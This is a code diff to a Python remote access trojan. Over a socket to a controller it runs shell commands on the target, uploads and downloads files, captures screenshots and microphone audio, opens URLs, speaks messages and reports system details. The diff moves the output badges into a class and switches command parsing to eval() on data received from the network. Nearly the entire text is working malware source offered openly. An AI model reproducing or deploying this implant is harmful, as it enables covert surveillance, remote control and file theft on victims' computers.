@@ -1,11 +1,17 @@
 #!/usr/bin/env python3
 
-I = '\033[1;77m[i] \033[0m'
-Q = '\033[1;77m[?] \033[0m'
-S = '\033[1;32m[+] \033[0m'
-W = '\033[1;33m[!] \033[0m'
-E = '\033[1;31m[-] \033[0m'
-G = '\033[1;34m[*] \033[0m'
+class badges:
+    def __init__(self):
+        self.I = '\033[1;77m[i] \033[0m'
+        self.Q = '\033[1;77m[?] \033[0m'
+        self.S = '\033[1;32m[+] \033[0m'
+        self.W = '\033[1;33m[!] \033[0m'
+        self.E = '\033[1;31m[-] \033[0m'
+        self.G = '\033[1;34m[*] \033[0m'
+        self.GREEN = '\033[0;33m'
+        self.RESET = '\033[0m'
+
+badges = badges()
 
 import struct
 import socket
@@ -57,13 +63,12 @@ def execute(command):
     command_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     return command_output.stdout.read() + command_output.stderr.read()
 
-def upload(command):
-    output_filename = "".join(command.split("download")).strip()
+def upload(output_filename):
     if not output_filename.strip():
         unicorn.send("Usage: download <remote_file>".encode("UTF-8"))
     else:
         if not os.path.isfile(output_filename):
-            unicorn.send((E+"Local file: {}: does not exist!".format(output_filename)).encode("UTF-8"))
+            unicorn.send((badges.E +"Local file: {}: does not exist!".format(output_filename)).encode("UTF-8"))
         else:
             unicorn.send("true".encode("UTF-8"))
             with open(output_filename, "rb") as wf:
@@ -76,8 +81,7 @@ def upload(command):
                         return
             unicorn.send("success".encode("UTF-8"))
 
-def download(command):
-    output_filename = "".join(command.split("upload")).strip()
+def download(output_filename):
     if not output_filename.strip():
         unicorn.send("Usage: upload <local_file>".encode("UTF-8"))
     else:
@@ -94,8 +98,7 @@ def download(command):
             wf.write(data)
         wf.close()
 
-def openurl(command):
-    url = "".join(command.split("openurl")).strip()
+def openurl(url):
     browser.open(url)
 
 def listen_audio():
@@ -137,7 +140,7 @@ def listen_audio():
                 p.terminate()
                 return
 
-def say_message(command):
+def say_message(message):
     try:
         import pyttsx3
     except:
@@ -149,7 +152,7 @@ def say_message(command):
             return
     unicorn.send("success".encode("UTF-8"))
     engine = pyttsx3.init()
-    engine.say("".join(command.split("say")).strip())
+    engine.say(message)
     engine.runAndWait()
             
 def screenshot():
@@ -167,63 +170,63 @@ def shell(handler=handler):
     while True:
         command = unicorn.recv()
         if command.strip():
-            command = command.decode("UTF-8", "ignore").strip()
-            ui = command.split(" ")
-            if ui[0] == "username":
+            command = eval(command.decode("UTF-8", "ignore").strip())
+            print(command)
+            if command[0] == "username":
                 unicorn.send(getpass.getuser().encode("UTF-8"))
-            elif ui[0] == "hostname":
+            elif command[0] == "hostname":
                 unicorn.send(platform.node().encode("UTF-8"))
-            elif ui[0] == "download":
-                upload(command)
-            elif ui[0] == "upload":
-                download(command)
-            elif ui[0] == "screenshot":
+            elif command[0] == "download":
+                upload(command[1])
+            elif command[0] == "upload":
+                download(command[1])
+            elif command[0] == "screenshot":
                 screenshot()
-            elif ui[0] == "mic":
+            elif command[0] == "mic":
                 listen_audio()
-            elif ui[0] == "load":
-                if len(ui) < 2:
+            elif command[0] == "load":
+                if len(command) < 2:
                     pass
                 else:
-                    payload_output = execute("".join(command.split("load")).strip())
+                    payload_output = execute(command[1])
                     unicorn.send(bytes(payload_output.strip()))
-            elif ui[0] == "exit":
+            elif command[0] == "exit":
                 s.shutdown(2)
                 s.close()
                 break
-            elif ui[0] == "openurl":
-                openurl(command)
-            elif ui[0] == "rickroll":
+            elif command[0] == "openurl":
+                openurl(command[1])
+            elif command[0] == "rickroll":
                 browser.open("https://www.youtube.com/watch?v=oHg5SJYRHA0")
-                unicorn.send((S+"Target has been rickrolled!").encode("UTF-8"))
-            elif ui[0] == "cd":
-                directory = "".join(command.split("cd")).strip()
+                unicorn.send((badges.S + "Target has been rickrolled!").encode("UTF-8"))
+            elif command[0] == "cd":
+                directory = command[1]
                 if not directory.strip():
                     unicorn.send("{}".format(os.getcwd()).encode("UTF-8"))
                 elif directory == "-":
                     if not temp_directory:
-                        unicorn.send((E+"Failed to change directory").encode("UTF-8"))
+                        unicorn.send((badges.E +"Failed to change directory").encode("UTF-8"))
                     else:
                         temp_directory_2 = os.getcwd()
                         os.chdir(temp_directory)
-                        unicorn.send((I+"Changed to directory {}.".format(temp_directory)).encode("UTF-8"))
+                        unicorn.send((badges.I +"Changed to directory {}.".format(temp_directory)).encode("UTF-8"))
                         temp_directory = temp_directory_2
                 elif directory =="--":
                     temp_directory = os.getcwd()
                     os.chdir(main_directory)
-                    unicorn.send((I+"Changed to directory {}.".format(main_directory)).encode("UTF-8"))
+                    unicorn.send((badges.I +"Changed to directory {}.".format(main_directory)).encode("UTF-8"))
                 else:
                     if not os.path.isdir(directory):
-                        unicorn.send((E+"Failed to change directory").encode("UTF-8"))
+                        unicorn.send((badges.E +"Failed to change directory").encode("UTF-8"))
                     else:
                         temp_directory = os.getcwd()
                         os.chdir(directory)
-                        unicorn.send((I+"Changed to directory {}.".format(directory)).encode("UTF-8"))
-            elif ui[0] == "say":
-                say_message(command)
-            elif ui[0] == "pwd":
+                        unicorn.send((badges.I +"Changed to directory {}.".format(directory)).encode("UTF-8"))
+            elif command[0] == "say":
+                say_message(command[1])
+            elif command[0] == "pwd":
                 unicorn.send(str(os.getcwd()).encode("UTF-8"))
-            elif ui[0] == "sysinfo":
+            elif command[0] == "sysinfo":
                 sysinfo = ""
                 sysinfo += f"Operating System: {platform.system()}\n"
                 sysinfo += f"Computer Name: {platform.node()}\n"
@@ -231,15 +234,14 @@ def shell(handler=handler):
                 sysinfo += f"Release Version: {platform.release()}\n"
                 sysinfo += f"Processor Architecture: {platform.processor()}"
                 unicorn.send(sysinfo.encode("UTF-8"))
-            elif ui[0] == "shell":
-                command = "".join(command.split("shell")).strip()
-                if not command.strip():
+            elif command[0] == "shell":
+                if len(command) < 2:
                     unicorn.send("Usage: shell <command>".encode("UTF-8"))
                 else:
-                    command_output = execute(command)
+                    command_output = execute(command[1])
                     unicorn.send(bytes(command_output.strip()))
             else:
-                unicorn.send((E+"Unrecognized command!").encode())
+                unicorn.send((badges.E +"Unrecognized command!").encode())
     sys.exit()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
